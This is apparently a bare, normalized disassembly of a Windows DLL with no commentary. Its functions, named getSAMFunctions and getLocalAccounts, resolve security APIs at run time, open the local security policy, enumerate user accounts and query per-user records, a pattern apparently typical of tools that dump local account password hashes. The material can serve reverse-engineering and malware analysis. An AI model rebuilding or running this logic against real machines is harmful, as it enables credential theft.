je r-xdata
xor edx edx
lea rcx [ rbp - 0x19 ]
call sub_18001775c
nop
mov [ rbp - 0x11 ] r13
mov [ rbp - 0x9 ] 0x0
mov [ rbp - 0x1 ] r13
mov [ rbp + 0x7 ] 0x0
mov [ rbp + 0xf ] r13
mov [ rbp + 0x17 ] 0x0
mov [ rbp + 0x1f ] r13
mov [ rbp + 0x27 ] 0x0
test rdi rdi
jne r-xdata
lea rdi [ rax + 0x30 ]
mov [ rbp + 0x1f ] r13
mov rcx [ rbp + 0xf ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov rdx rdi
lea rcx [ rbp - 0x19 ]
call sub_180017504
nop
mov edi 0x1
mov [ rbp + 0x67 ] edi
mov [ rbx + 0x8 ] r13
lea rax [ r--data ]
mov [ rbx ] rax
mov rcx rbx
call sub_180009520
nop
jmp r-xdata
lea rax [ r--data ]
mov [ rbp + 0x67 ] rax
lea rdx [ rbp + 0x67 ]
lea rcx [ rbp - 0x31 ]
call sub_180018524
lea r11 [ r--data ]
mov [ rbp - 0x31 ] r11
lea rdx [ r--data ]
lea rcx [ rbp - 0x31 ]
call sub_180019410
int3
mov [ rbp + 0xf ] r13
mov rcx [ rbp - 0x1 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov [ rsi ] rbx
test dil 0x1
je r-xdata
mov [ rbp - 0x1 ] r13
mov rcx [ rbp - 0x11 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov [ rbp - 0x11 ] r13
lea rcx [ rbp - 0x19 ]
call sub_18001778c
call sub_180018b3c
sub_180009520
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x48
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov rsi rcx
mov r14b 0x1
call sub_180018c10
mov r12 rax
xor r13d r13d
mov [ rsi + 0x10 ] r13
mov [ rsi + 0x20 ] r13
mov [ rsi + 0x28 ] r13
lea rdi [ r--data ]
call sub_18001700c
mov ebx 0x1
mov ecx ebx
call j_sub_180018a08
mov rdx rax
mov [ rsi + 0x10 ] rax
call sub_18001700c
mov [ rsp + 0x88 ] rax
lea rdx [ rsp + 0x88 ]
lea rcx [ r--data ]
call sub_180005c90
mov [ rsi + 0x20 ] rax
call sub_18001700c
mov [ rsp + 0x88 ] rax
lea rdx [ rsp + 0x88 ]
lea rcx [ r--data ]
call sub_180005c90
mov [ rsi + 0x28 ] rax
call sub_18001700c
mov [ rsp + 0x98 ] rax
mov rax [ r12 ]
movzx ecx [ rax ]
mov [ rsp + 0x80 ] cl
mov [ rsp + 0x88 ] r13w
mov [ rsp + 0x90 ] r13d
lea rax [ rsp + 0x98 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x90 ]
mov r8d 0x1
lea rdx [ rsp + 0x80 ]
lea rcx [ rsp + 0x88 ]
call sub_180017a9c
movzx eax [ rsp + 0x88 ]
mov [ rsi + 0x18 ] ax
call sub_18001700c
mov [ rsp + 0x98 ] rax
mov rax [ r12 + 0x8 ]
movzx ecx [ rax ]
mov [ rsp + 0x80 ] cl
mov [ rsp + 0x88 ] r13w
mov [ rsp + 0x90 ] r13d
lea rax [ rsp + 0x98 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x90 ]
mov r8d 0x1
lea rdx [ rsp + 0x80 ]
lea rcx [ rsp + 0x88 ]
call sub_180017a9c
movzx eax [ rsp + 0x88 ]
mov [ rsi + 0x1a ] ax
test r14b r14b
je r-xdata
movzx ecx [ rdi ]
mov [ rdx ] cl
dec rbx
inc rdx
inc rdi
jmp r-xdata
add rsp 0x48
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
call sub_18001700c
mov [ rsp + 0x98 ] rax
mov [ rsp + 0x80 ] 0x2e
mov [ rsp + 0x88 ] r13w
mov [ rsp + 0x90 ] r13d
lea rax [ rsp + 0x98 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x90 ]
mov r8d 0x1
lea rdx [ rsp + 0x80 ]
lea rcx [ rsp + 0x88 ]
call sub_180017a9c
movzx r11d [ rsp + 0x88 ]
mov [ rsi + 0x18 ] r11w
call sub_18001700c
mov [ rsp + 0x98 ] rax
mov [ rsp + 0x80 ] 0x2c
mov [ rsp + 0x88 ] r13w
mov [ rsp + 0x90 ] r13d
lea rax [ rsp + 0x98 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x90 ]
mov r8d 0x1
lea rdx [ rsp + 0x80 ]
lea rcx [ rsp + 0x88 ]
call sub_180017a9c
movzx r11d [ rsp + 0x88 ]
mov [ rsi + 0x1a ] r11w
test rbx rbx
je r-xdata
sub_180009790
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edx 0xa
mov rbx rcx
call sub_18000db30
mov rax [ rbx ]
xor edi edi
movsxd rcx [ rax + 0x4 ]
test [ rcx + rbx + 0x10 ] 0x6
jne r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
mov rcx [ rcx + rbx + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove edi ecx
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
call sub_1800037f0
or edx 0x4
sub_180009800
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
lea rcx [ r--data ]
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x20 ] rdi
call [ GetModuleHandleW@IAT ]
lea rcx [ r--data ]
mov rbx rax
call [ GetModuleHandleW@IAT ]
mov rdi rax
test rbx rbx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
mov rdi [ rsp + 0x20 ]
mov rbx [ rsp + 0x30 ]
je r-xdata
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
add rsp 0x28
retn
cmp [ rw-data ] 0x0
je r-xdata
lea rdx [ r--data ]
mov rcx rbx
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rdi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rdi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
add rsp 0x28
retn
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x1
add rsp 0x28
retn
getSAMFunctions
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x140
lea rax [ r--data ]
mov rdi rcx
lea rcx [ rsp + 0xa8 ]
mov [ rsp + 0x20 ] rax
lea rax [ r--data ]
xor ebx ebx
mov [ rsp + 0xa8 ] rax
mov [ rsp + 0x160 ] ebx
call sub_180003960
lea r11 [ rsp + 0x28 ]
lea rcx [ rsp + 0xa8 ]
mov [ rsp + 0xf8 ] rbx
mov [ rsp + 0xf0 ] r11
call sub_180005300
mov [ rsp + 0x100 ] ax
cmp [ rsp + 0xf0 ] rbx
jne r-xdata
mov rax [ rsp + 0x20 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rsp + rcx + 0x20 ] rax
lea rcx [ rsp + 0x28 ]
call sub_1800050e0
lea r11 [ r--data ]
mov [ rsp + 0x98 ] rbx
mov [ rsp + 0x28 ] r11
mov [ rsp + 0xa0 ] 0x4
call sub_180009800
lea rcx [ r--data ]
test al al
lea rbx [ r--data ]
cmovne rbx rcx
lea rcx [ rsp + 0x20 ]
lea rdx [ r--data ]
call sub_180008ab0
mov rdx rbx
mov rcx rax
call sub_180008ab0
mov rcx rax
call sub_180009790
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ rsp + 0x110 ]
lea rcx [ rsp + 0x20 ]
call sub_18000ddd0
mov rcx rdi
mov rdx rax
call sub_180001b10
lea rcx [ rsp + 0xa8 ]
movzx ebx al
call sub_18000dd20
lea r11 [ r--data ]
lea rcx [ rsp + 0xa8 ]
mov [ rsp + 0xa8 ] r11
call sub_180017208
movzx eax bl
mov rbx [ rsp + 0x150 ]
add rsp 0x140
pop rdi
retn
mov edx [ rsp + 0xb8 ]
lea rcx [ rsp + 0xa8 ]
xor r8d r8d
or edx 0x4
call sub_1800037f0
getLocalAccounts
push rbp
push rbx
push r13
lea rbp [ rsp - 0x500 ]
sub rsp 0x600
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4d0 ] rax
mov rbx rdx
mov r13 rcx
call sub_180009800
test al al
je r-xdata
mov rdx rbx
mov rcx r13
call getSAMFunctions
mov rcx [ rbx ]
mov [ rsp + 0x5f8 ] rdi
mov [ rsp + 0x5f0 ] r12
mov [ rsp + 0x5e8 ] r14
xor r14b r14b
mov dil 0x1
mov r12d 0x12
cmp rcx [ rbx + 0x8 ]
je r-xdata
xor ebx ebx
xor eax eax
lea r9 [ rbp - 0x68 ]
lea rdx [ rbp - 0x50 ]
mov r8d 0xf0fff
xor ecx ecx
mov [ rbp - 0x68 ] rbx
mov [ rbp - 0x70 ] rbx
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x50 ] rbx
mov [ rbp - 0x50 ] rax
mov [ rbp - 0x48 ] rax
mov [ rbp - 0x40 ] rax
mov [ rbp - 0x38 ] rax
mov [ rbp - 0x30 ] rax
mov [ rbp - 0x28 ] rax
mov [ rsp + 0x40 ] rbx
mov [ rbp - 0x58 ] ebx
mov [ rbp - 0x60 ] ebx
mov [ rsp + 0x48 ] rbx
call [ LsaOpenPolicy@IAT ]
test eax eax
js r-xdata
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x60 ]
mov r8d 0x2d
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x60 ] bx
call sub_1800023b0
lea rdx [ rsp + 0x60 ]
mov rcx r13
call sub_180001b10
movzx edi al
mov rcx [ rbp - 0x68 ]
lea r8 [ rbp - 0x78 ]
lea edx [ rbx + 0x5 ]
call [ LsaQueryInformationPolicy@IAT ]
test eax eax
js r-xdata
lea rdx [ r--data ]
call sub_180018e84
test eax eax
je r-xdata
mov rcx [ rcx ]
mov rcx [ rbp + 0x4d0 ]
xor rcx rsp
call sub_180018450
add rsp 0x600
pop r13
pop rbx
pop rbp
retn
lea rdx [ r--data ]
lea rcx [ rsp + 0x60 ]
mov r8d 0x43
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x60 ] bx
call sub_1800023b0
lea rdx [ rsp + 0x60 ]
mov rcx r13
call sub_180001b10
mov rcx [ rbp - 0x68 ]
movzx edi al
call [ LsaClose@IAT ]
jmp r-xdata
mov r9d 0x1
lea rdx [ rbp - 0x70 ]
xor ecx ecx
mov r8d r9d
call [ rw-data ]
test eax eax
js r-xdata
mov r14b 0x1
mov rcx [ rbx + 0x8 ]
sub rcx 0x28
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov r14 [ rsp + 0x5e8 ]
mov r12 [ rsp + 0x5f0 ]
movzx eax dil
mov rdi [ rsp + 0x5f8 ]
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x60 ]
mov r8d 0x3c
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x60 ] bx
call sub_1800023b0
lea rdx [ rsp + 0x60 ]
mov rcx r13
call sub_180001b10
mov rcx [ rbp - 0x78 ]
movzx edi al
call [ LsaFreeMemory@IAT ]
mov rcx [ rbp - 0x68 ]
call [ LsaClose@IAT ]
jmp r-xdata
mov r8 [ rbp - 0x78 ]
mov rcx [ rbp - 0x70 ]
lea r9 [ rsp + 0x58 ]
mov r8 [ r8 + 0x10 ]
mov edx 0xf07ff
call [ rw-data ]
test eax eax
js r-xdata
lea rdx [ r--data ]
call sub_180018e84
test eax eax
je r-xdata
mov rcx [ rcx ]
lea rdx [ r--data ]
call sub_180018e84
test eax eax
jne r-xdata
mov rcx [ rcx ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x60 ]
mov r8d 0x34
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x60 ] bx
call sub_1800023b0
lea rdx [ rsp + 0x60 ]
mov rcx r13
call sub_180001b10
lea rcx [ rbp - 0x70 ]
movzx edi al
call [ rw-data ]
mov rcx [ rbp - 0x78 ]
call [ LsaFreeMemory@IAT ]
mov rcx [ rbp - 0x68 ]
call [ LsaClose@IAT ]
jmp r-xdata
mov rax [ rbp - 0x78 ]
lea rcx [ rbp + 0x58 ]
mov [ rsp + 0x630 ] rsi
movzx r8d [ rax ]
mov rdx [ rax + 0x8 ]
mov [ rsp + 0x5e0 ] r15
shr r8 0x1
mov [ rbp + 0x70 ] 0x7
mov [ rbp + 0x68 ] rbx
mov [ rbp + 0x58 ] bx
call sub_1800023b0
nop [ rax + rax ] eax
mov r12d 0x15
mov rcx [ rbx + 0x8 ]
sub rcx 0x28
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbx ]
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x40 ]
mov esi ebx
cmp [ rcx ] 0x0
jbe r-xdata
cmp eax 0x105
je r-xdata
lea rdx [ r--data ]
call sub_180018e84
test eax eax
jne r-xdata
mov rcx [ rcx ]
call [ rw-data ]
xor r15d r15d
mov ebx r15d
nop [ rax ] eax
lea rdx [ r--data ]
lea rcx [ rbp - 0x20 ]
mov r8d 0x2e
mov [ rbp - 0x8 ] 0x7
mov [ rbp - 0x10 ] rbx
mov [ rbp - 0x20 ] bx
call sub_1800023b0
lea rdx [ rbp - 0x20 ]
mov rcx r13
call sub_180001b10
movzx edi al
jmp r-xdata
lea rcx [ rsp + 0x58 ]
call [ rw-data ]
cmp [ rbp + 0x70 ] 0x8
mov r15 [ rsp + 0x5e0 ]
mov rsi [ rsp + 0x630 ]
jb r-xdata
test dil dil
jne r-xdata
mov r15d [ rbp - 0x5c ]
xor ebx ebx
mov rax [ rcx + 0x8 ]
lea rcx [ rbp + 0x80 ]
movzx r8d [ rax + rbx + 0x8 ]
mov rdx [ rax + rbx + 0x10 ]
mov [ rbp + 0x98 ] 0x7
shr r8 0x1
mov [ rbp + 0x90 ] r15
mov [ rbp + 0x80 ] r15w
call sub_1800023b0
mov rax [ rsp + 0x40 ]
mov [ rsp + 0x48 ] r15
mov rcx [ rax + 0x8 ]
lea r9 [ rsp + 0x50 ]
mov edx 0xf07ff
mov r8d [ rcx + rbx ]
mov rcx [ rsp + 0x58 ]
call [ rw-data ]
test eax eax
js r-xdata
cmp r15d 0x105
jne r-xdata
lea rcx [ rbp - 0x70 ]
mov [ rbp + 0x70 ] 0x7
mov [ rbp + 0x68 ] rbx
mov [ rbp + 0x58 ] bx
call [ rw-data ]
mov rcx [ rbp - 0x78 ]
call [ LsaFreeMemory@IAT ]
mov rcx [ rbp - 0x68 ]
call [ LsaClose@IAT ]
jmp r-xdata
mov rcx [ rbp + 0x58 ]
call j_sub_180018b3c
mov rcx [ rsp + 0x58 ]
lea rax [ rbp - 0x60 ]
lea r9 [ rsp + 0x40 ]
mov [ rsp + 0x28 ] rax
lea rdx [ rbp - 0x58 ]
xor r8d r8d
mov [ rsp + 0x20 ] 0x3e8
call [ rw-data ]
mov r15d eax
mov [ rbp - 0x5c ] eax
test eax eax
jns r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x60 ]
mov r8d 0x28
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] r15
mov [ rsp + 0x60 ] r15w
call sub_1800023b0
lea rdx [ rsp + 0x60 ]
mov rcx r13
call sub_180001b10
movzx edi al
mov rcx [ rsp + 0x50 ]
lea r8 [ rsp + 0x48 ]
mov edx r12d
call [ rw-data ]
test eax eax
js r-xdata
mov rcx [ rsp + 0x40 ]
inc esi
add rbx 0x18
mov [ rbp + 0x98 ] 0x7
mov [ rbp + 0x90 ] r15
mov [ rbp + 0x80 ] r15w
cmp esi [ rcx ]
jb r-xdata
mov rcx [ rbp + 0x80 ]
call j_sub_180018b3c
cmp [ rw-data ] r15
je r-xdata
lea r8 [ rsp + 0x48 ]
lea rcx [ rbp + 0xb0 ]
mov edx r12d
call sub_18000b4d0
mov rdx [ rbp - 0x78 ]
mov r11 [ rsp + 0x40 ]
mov rax [ r11 + 0x8 ]
mov ecx [ rbx + rax ]
mov [ rbp + 0xb0 ] ecx
movzx r8d [ rdx ]
mov rdx [ rdx + 0x8 ]
lea rcx [ rbp + 0xe0 ]
shr r8 0x1
call sub_1800023b0
cmp [ rbp + 0xc8 ] r15
jne r-xdata
test dil dil
je r-xdata
lea rcx [ rsp + 0x50 ]
call [ rw-data ]
jmp r-xdata
lea rdx [ rbp + 0x58 ]
lea rcx [ rbp + 0x8 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov [ rbp + 0x20 ] 0x7
mov [ rbp + 0x18 ] r15
mov [ rbp + 0x8 ] r15w
call sub_180002260
lea rdx [ rbp + 0x80 ]
lea rcx [ rbp + 0x30 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov [ rbp + 0x48 ] 0x7
mov [ rbp + 0x40 ] r15
mov [ rbp + 0x30 ] r15w
call sub_180002260
mov r11 [ rsp + 0x40 ]
mov rax [ rsp + 0x50 ]
mov rcx [ r11 + 0x8 ]
mov [ rsp + 0x30 ] r14b
lea r9 [ rbp + 0x8 ]
mov edx [ rcx + rbx ]
lea r8 [ rbp + 0x30 ]
mov rcx r13
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rax
call sub_18000c200
movzx edi al
lea r8 [ rbp + 0xb0 ]
movzx r9d r14b
mov edx r12d
mov rcx r13
call sub_18000a8b0
mov rcx [ rsp + 0x48 ]
mov edx r12d
movzx edi al
call [ rw-data ]
lea rcx [ rbp + 0xb0 ]
call sub_18000a420
mov rax [ rsp + 0x40 ]
lea rcx [ rbp + 0xb8 ]
mov rdx [ rax + 0x8 ]
movzx r8d [ rdx + rbx + 0x8 ]
mov rdx [ rdx + rbx + 0x10 ]
shr r8 0x1
call sub_1800023b0
cmp [ rbp + 0x98 ] 0x8
jb r-xdata
sub_18000a420
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rcx + 0x408 ] 0x8
mov rbx rcx
jb r-xdata
xor edi edi
mov [ rbx + 0x408 ] 0x7
mov [ rbx + 0x400 ] rdi
mov [ rbx + 0x3f0 ] di
cmp [ rbx + 0x3d8 ] 0x8
jb r-xdata
mov rcx [ rcx + 0x3f0 ]
call j_sub_180018b3c
mov [ rbx + 0x3d8 ] 0x7
mov [ rbx + 0x3d0 ] rdi
mov [ rbx + 0x3c0 ] di
cmp [ rbx + 0x3a8 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x3c0 ]
call j_sub_180018b3c
mov [ rbx + 0x3a8 ] 0x7
mov [ rbx + 0x3a0 ] rdi
mov [ rbx + 0x390 ] di
cmp [ rbx + 0x380 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x390 ]
call j_sub_180018b3c
mov [ rbx + 0x380 ] 0x7
mov [ rbx + 0x378 ] rdi
mov [ rbx + 0x368 ] di
cmp [ rbx + 0x358 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x368 ]
call j_sub_180018b3c
mov [ rbx + 0x358 ] 0x7
mov [ rbx + 0x350 ] rdi
mov [ rbx + 0x340 ] di
cmp [ rbx + 0x330 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x340 ]
call j_sub_180018b3c
mov [ rbx + 0x330 ] 0x7
mov [ rbx + 0x328 ] rdi
mov [ rbx + 0x318 ] di
cmp [ rbx + 0x300 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x318 ]
call j_sub_180018b3c
mov [ rbx + 0x300 ] 0x7
mov [ rbx + 0x2f8 ] rdi
mov [ rbx + 0x2e8 ] di
cmp [ rbx + 0x2d8 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x2e8 ]
call j_sub_180018b3c
mov [ rbx + 0x2d8 ] 0x7
mov [ rbx + 0x2d0 ] rdi
mov [ rbx + 0x2c0 ] di
cmp [ rbx + 0x2b0 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x2c0 ]
call j_sub_180018b3c
mov [ rbx + 0x2b0 ] 0x7
mov [ rbx + 0x2a8 ] rdi
mov [ rbx + 0x298 ] di
cmp [ rbx + 0x288 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x298 ]
call j_sub_180018b3c
mov [ rbx + 0x288 ] 0x7
mov [ rbx + 0x280 ] rdi
mov [ rbx + 0x270 ] di
cmp [ rbx + 0x260 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x270 ]
call j_sub_180018b3c
mov [ rbx + 0x260 ] 0x7
mov [ rbx + 0x258 ] rdi
mov [ rbx + 0x248 ] di
cmp [ rbx + 0x238 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x248 ]
call j_sub_180018b3c
mov [ rbx + 0x238 ] 0x7
mov [ rbx + 0x230 ] rdi
mov [ rbx + 0x220 ] di
cmp [ rbx + 0x208 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x220 ]
call j_sub_180018b3c
mov [ rbx + 0x208 ] 0x7
mov [ rbx + 0x200 ] rdi
mov [ rbx + 0x1f0 ] di
cmp [ rbx + 0x1e0 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x1f0 ]
call j_sub_180018b3c
mov [ rbx + 0x1e0 ] 0x7
mov [ rbx + 0x1d8 ] rdi
mov [ rbx + 0x1c8 ] di
cmp [ rbx + 0x1b8 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x1c8 ]
call j_sub_180018b3c
mov [ rbx + 0x1b8 ] 0x7
mov [ rbx + 0x1b0 ] rdi
mov [ rbx + 0x1a0 ] di
cmp [ rbx + 0x190 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x1a0 ]
call j_sub_180018b3c
mov [ rbx + 0x190 ] 0x7
mov [ rbx + 0x188 ] rdi
mov [ rbx + 0x178 ] di
cmp [ rbx + 0x168 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x178 ]
call j_sub_180018b3c
mov [ rbx + 0x168 ] 0x7
mov [ rbx + 0x160 ] rdi
mov [ rbx + 0x150 ] di
cmp [ rbx + 0x140 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x150 ]
call j_sub_180018b3c
mov [ rbx + 0x140 ] 0x7
mov [ rbx + 0x138 ] rdi
mov [ rbx + 0x128 ] di
cmp [ rbx + 0x118 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x128 ]
call j_sub_180018b3c
mov [ rbx + 0x118 ] 0x7
mov [ rbx + 0x110 ] rdi
mov [ rbx + 0x100 ] di
cmp [ rbx + 0xf0 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x100 ]
call j_sub_180018b3c
mov [ rbx + 0xf0 ] 0x7
mov [ rbx + 0xe8 ] rdi
mov [ rbx + 0xd8 ] di
cmp [ rbx + 0xc8 ] 0x8
jb r-xdata
mov rcx [ rbx + 0xd8 ]
call j_sub_180018b3c
mov [ rbx + 0xc8 ] 0x7
mov [ rbx + 0xc0 ] rdi
mov [ rbx + 0xb0 ] di
cmp [ rbx + 0xa0 ] 0x8
jb r-xdata
mov rcx [ rbx + 0xb0 ]
call j_sub_180018b3c
mov [ rbx + 0xa0 ] 0x7
mov [ rbx + 0x98 ] rdi
mov [ rbx + 0x88 ] di
cmp [ rbx + 0x70 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x88 ]
call j_sub_180018b3c
mov [ rbx + 0x70 ] 0x7
mov [ rbx + 0x68 ] rdi
mov [ rbx + 0x58 ] di
cmp [ rbx + 0x48 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x58 ]
call j_sub_180018b3c
mov [ rbx + 0x48 ] 0x7
mov [ rbx + 0x40 ] rdi
mov [ rbx + 0x30 ] di
cmp [ rbx + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x30 ]
call j_sub_180018b3c
mov [ rbx + 0x20 ] 0x7
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x8 ] di
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx + 0x8 ]
call j_sub_180018b3c
sub_18000a8b0
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1b0 ]
sub rsp 0x2b0
mov [ rsp + 0x58 ] 0xfffffffffffffffe
mov [ rsp + 0x2f8 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1a0 ] rax
movzx ebx r9b
mov rdi r8
mov [ rsp + 0x20 ] r8
mov esi edx
mov [ rsp + 0x40 ] rcx
lea rcx [ rsp + 0x60 ]
call sub_180005f70
nop
cmp esi 0x12
je r-xdata
lea rcx [ rsp + 0x70 ]
test bl bl
je r-xdata
cmp esi 0x15
jne r-xdata
lea rdx [ r--data ]
call sub_180008ab0
mov rcx rax
mov edx [ rdi ]
call sub_180005d90
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x8 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x30 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x3c0 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x3f0 ]
call sub_18000def0
mov rax [ rsp + 0x20 ]
lea rbx [ rax + 0x8 ]
mov edx [ rax ]
call sub_180005d90
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
mov rcx rax
mov rdx rbx
call sub_18000def0
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x30 ]
call sub_18000def0
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x3c0 ]
call sub_18000def0
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x3f0 ]
call sub_18000def0
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
jmp r-xdata
lea rcx [ rsp + 0x70 ]
call sub_180009790
